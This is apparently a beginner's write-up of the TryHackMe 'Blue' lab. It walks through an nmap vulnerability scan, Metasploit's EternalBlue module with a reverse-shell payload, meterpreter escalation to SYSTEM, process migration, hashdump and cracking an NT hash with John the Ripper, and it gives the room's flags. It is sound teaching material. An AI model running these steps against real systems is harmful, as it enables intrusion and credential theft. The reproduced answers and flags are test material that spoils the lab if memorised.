# Blue

## Purpose of this Room
This room, as stated in its introduction, is not meant to be a "boot2root CTF." Rather, it is a room that teaches beginners the fundamentals of the exploitation process using a well-known exploit -- EternalBlue.

## [Task 1] Recon

When given a machine, your first task will generally involve scanning the machine to get an idea of what services are running, the system in use, and so on. One tool for this is _Nmap_.

**[Task 1, Question 1] Scan the machine. (If you are unsure how to do this, I recommend checking out the Nmap room.)**
The room provides a hint for how to scan the machine: run ```nmap -sV --vv --script vuln TARGET_IP```

Here's all we're doing with that line: we're asking nmap to check for service versions (-sV), which returns information that is often helpful to know when we're trying to exploit a machine. We're also asking it to produce verbose output (-vv) so we can keep track of the scan's progress, as well as run a series of scripts under the "vuln" category against the server on the TARGET_IP. The "vuln" category, as you may expect, checks to see if a machine is vulnerable to any number of exploits.

**[Task 1, Question 2] How many ports are open with a port number under 1000? - 3**

The hint suggests we check near the top of the nmap output for PORT, STATE, and SERVICE. We can ignore any port greater than 1000.

![image](https://github.com/abeeching/thm-stuff/assets/56741029/a8aa7548-526c-438a-b62e-f7912ed73474)


**[Task 1, Question 3] What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067) - ms17-010**

According to the very same Nmap output, we see that the machine is vulnerable to ms17-010:

![image](https://github.com/abeeching/thm-stuff/assets/56741029/0630fd49-e65e-44f8-b63b-1dd476f985af)


### An Aside: What's EternalBlue?
The hint to the question above provides a little bit of background, in that it was revealed by the a group known as the ShadowBrokers and exploits an issue with SMBv1. It's an interesting topic to read about, and you should definitely look into it, but here's the Sparknotes, so to speak:
- The United States National Security Agency (NSA) developed a vulnerability that targeted old versions of the Server Message Block (SMBv1) protocol found in Windows operating systems.
- SMB allows you to share information about files, printers, and the network, and so on.
- I'll leave the technical details to [folks who can probably explain it better than I can](https://www.sentinelone.com/blog/eternalblue-nsa-developed-exploit-just-wont-die/), but an attacker can construct and send a malicious SMBv1 packet, causing a buffer overflow and leading to remote code execution.
- The NSA suspects that the vulnerabilities have been stolen, and so they inform Microsoft. Microsoft issues a patch in March of 2017, as well as security bulletin MS17-010. It's generally pretty hard to get folks to update their computers for various reasons, such as the fact that updates may well break legacy systems that are needed in certain companies.
- In April of 2017, the Shadow Brokers, a hacker group, leaked EternalBlue along with other NSA exploits. In May of 2017, the WannaCry ransomware attack begins, using EternalBlue to spread. This is likely the most high-profile incident relating to EternalBlue -- it was particularly notable in that it disrupted some operations in the UK's National Health Service -- but other attacks have occurred such as NotPetya.
- The WannaCry attack pushes Microsoft to release emergency updates to operating systems that have reached their end-of-life, such as Windows XP.

It's a particularly interesting read for technical and for ethical reasons -- I highly suggest researching this more if you're interested in how things played out.

## [Task 2] Gain Access

Now that we know what we can use, it's time to exploit it. EternalBlue has since been made into a module in _Metasploit_, so we'll use that to do the job. There's an entire series of rooms on Metasploit, but we'll just use this exploit as an example.

**[Task 2, Question 1] Start Metasploit**

To begin using Metasploit, issue the command ```msfconsole``` in your terminal.

**[Task 2, Question 2] Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........) - exploit/windows/smb/ms17_010_eternalblue**

You can always search for things in Metasploit by running ```search [search term]``` in the Metasploit console. In this case, you can run ```search eternalblue``` or perhaps ```search ms17-010```. Either way, the first result is likely the one you're looking for. You can type ```use 0``` after searching, or just run ```use exploit/windows/smb/ms17_010_eternalblue``` directly to begin setting up the exploit.

**[Task 2, Question 3] Show options and set the one required value. What is the name of this value? (All caps for submission) - RHOSTS**

If you want to view options, run ```show options``` once you have the exploit chosen. You're gonna probably want to scroll up to "Module Options" and see what's required and not set. As we see below, it's RHOSTS.

![image](https://github.com/abeeching/thm-stuff/assets/56741029/c99b3440-b919-45fa-a4a7-55e6b4218bbc)

This just means we need to set the target host, so all we have to do is ```set RHOSTS TARGET_IP```. You can examine the other options there if interested.

**[Task 2, Question 4] Usually it would be fine to run this exploit as-is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter: ```set payload windows/x64/shell/reverse_tcp```. With that done, run the exploit!**

Do as the question says -- this is just to make sure that we set the right kind of payload/shell for our purposes. Normally you can run _Meterpreter_ which acts as a shell and provides other functionalities, but all you really need is a Windows shell, so that's why we're using that specific payload. Anyway, once you set all that up, just run `run`.

**[Task 2, Question 5] Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.**

If you're seeing this, you're in the clear. It's entirely possible for EternalBlue to just crash the system itself (ideally, you would _check_ to see if the vulnerability exists on the machine, and then you would stop there unless you needed to get in the machine for whatever reason), so that's why we need to check first. Since I was able to get it to run, I hit CTRL + Z and keep this shell open in the background. You may need to type "y" to confirm that you want to background the shell.

![image](https://github.com/abeeching/thm-stuff/assets/56741029/dceb992f-8d7b-4c1d-a077-ccac796a17b0)


## [Task 3] Escalate

**[Task 3, Question 1] If you haven't already, background the previously-gained shell (CTRL + Z). Research online how to convert a shell to a meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) - post/multi/manage/shell_to_meterpreter**

Now our shell's running in the background. That means we can do stuff with it in the Metasploit console. Looking around online, we see that there is a module `shell_to_meterpreter`. So, we'll want to search for that in Metasploit.

**[Task 3, Question 2] Select this (use MODULE_PATH). Show options. What option are we required to change? - SESSION**

Use the exploit as before, and then run `show options`. As we see, we'll need to set the SESSION:

![image](https://github.com/abeeching/thm-stuff/assets/56741029/0f1dac29-8f2e-41c3-9ae1-ccdb8372be59)


**[Task 3, Question 3] Set the required option. You may need to list all of the sessions to find your target there.**
To do this, run `show sessions`. Chances are that you'll only have one session open - our session from the previous task.

![image](https://github.com/abeeching/thm-stuff/assets/56741029/813a4298-1280-4ca3-b957-c291956ed85a)


It'll have the id 1, so type `use SESSION 1`. You may need to adjust based on what you see.

**[Task 3, Question 4] Run! If this doesn't work, try completing the exploit from the previous task once more.**

OK, not a problem. Just type `run`. If it fails, you'll want to redo Task 2.

**[Task 3, Question 5] Once the Meterpreter shell conversion completes, select that session for use.**

To do so, you'll want to list your sessions again, and then see which one is the Meterpreter one. Then, run `sessions (METERPRETER_id)`. It'll probably be `sessions 2`.

![image](https://github.com/abeeching/thm-stuff/assets/56741029/641db8d3-bdb8-40d0-9977-5aa80f410eff)


**[Task 3, Question 6] Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a DOS shell via the command 'shell' and run 'whoami.' This should return that we are indeed system. Background this shell afterwards and select our Meterpreter session for use again.**

NT AUTHORITY\SYSTEM is basically the super-administrator of a Windows machine - having this level of access effectively means you have control over the entire system. Thus, this is usually where you end up after, say, doing a CTF on a Windows machine. We can follow the instructions above to confirm that we are, indeed, system.

![image](https://github.com/abeeching/thm-stuff/assets/56741029/0fa77c16-61c6-42e6-a7fa-a9ba4f8735ec)


**[Task 3, Question 7] List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).**

This is a good point to remember - the process that you end up in may not have system access, meaning you may not be able to interact with the system in the way you want to until you get into a SYSTEM-level process. We can check by heading back into Meterpreter and running ps, as instructed. There's a bunch of good options, so let's see if we can try to get into, say, PID 2924.

![image](https://github.com/abeeching/thm-stuff/assets/56741029/c9b88c04-84b0-45b6-a71c-2d8e9edabc6b)

**[Task 3, Question 8] Migrate to this process using the 'migrate PROCESS_ID' command where PROCESS_ID is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.**

It's possible that you migrate into a process that just breaks everything, so yeah, this will take a few attempts. Just keep trying at it until you get into a SYSTEM process that works! It uhhh... It took me a while. I've had to restart meterpreter many, many, many times. The PID that I ended up using, 2944, was a conhost.exe process if you were curious.

![image](https://github.com/abeeching/thm-stuff/assets/56741029/c3c2dd11-0472-428a-b5ef-679bfa73ba68)


## [Task 4] Cracking

**[Task 4, Question 1] Within our elevated meterpreter shell, run the command `hashdump`. This will dump all of the passwords on the machien as long as we have the correct privileges to do so. What is the name of the non-default user? - Jon**

Meterpreter comes with a lot of post-exploitation features, one of them being the ability to dump hashes of all users on the machine (as long as you are running a process at SYSTEM privileges - hence why we needed to migrate a little). If we run hashdump, we see this:

![image](https://github.com/abeeching/thm-stuff/assets/56741029/692f75d2-f1be-4c45-b1a2-7624e685bbb2)

It's important to note that Windows has a few default profiles, including Administrator and Guest. So, process of elimination tells us that Jon must be the non-default user.

**[Task 4, Question 2] Copy this password hash to a file and research how to crack it. What is the cracked password? - alqfna22**

So, what did we _actually_ do? We dumped some hashes, but what kind of hashes were they? Turns out that these are NT hashes. The hint tells us that the password this hash is associated with is in rockyou.txt, which is a huge wordlist of common passwords. So, let's crack the hash! We can do so with a tool like John the Ripper -- you can copy the hash for Jon into a file, and then run a command like ```john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash```. After some time, we find that the password is as noted above.

![image](https://github.com/abeeching/thm-stuff/assets/56741029/ba2aca2d-ab7c-47a3-9a24-ca0d0fb9adeb)


## [Task 5] Find flags!

**[Task 5, Flag 1] (This flag can be found at the system root.) - flag{access_the_machine}**

And now we get to work! The system root in Windows happens to be C:\, so just `cd C:\` and then `type flag1.txt`:

![image](https://github.com/abeeching/thm-stuff/assets/56741029/173bc534-bf24-4559-895b-a8b86ba676d4)


**[Task 5, Flag 2] (This flag can be found at the location where passwords are stored within Windows. Note that Windows doesn't like the location of this flag and CAN delete it; if this happens, that means you'll havfe to restart the machine. Lame, right?) - flag{sam_database_elevated_access}**

Passwords are stored in C:\Windows\System32\config, so cd into that directory and look for your flag there:

![image](https://github.com/abeeching/thm-stuff/assets/56741029/6e53a8ef-a472-4bfd-9861-45ba22835581)


**[Task 5, Flag 3] (This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.) - flag{admin_documents_can_be_valuable}**

Last but not least, you can check C:\Users\Jon\Documents for this flag. In order to get to this flag, you must have admin-level access, which you should naturally have as SYSTEM.

![image](https://github.com/abeeching/thm-stuff/assets/56741029/8bf88e5d-2931-4658-9c8b-b27763847e57)

And voila! That's all there is to it. Blue is quite an introductory room, but it's good for beginners to get an overview of the exploitation process, and the EternalBlue exploit is a good case study for this purpose. Note that sometimes you won't have access to, say, Metasploit. However, you can always find exploit code by looking for it on the Internet. A Google search along the lines of `(thing you want to exploit) (version number) exploit` can do the trick. You'll just want to make sure that the code actually does what it does...for (what I hope are) obvious reasons.
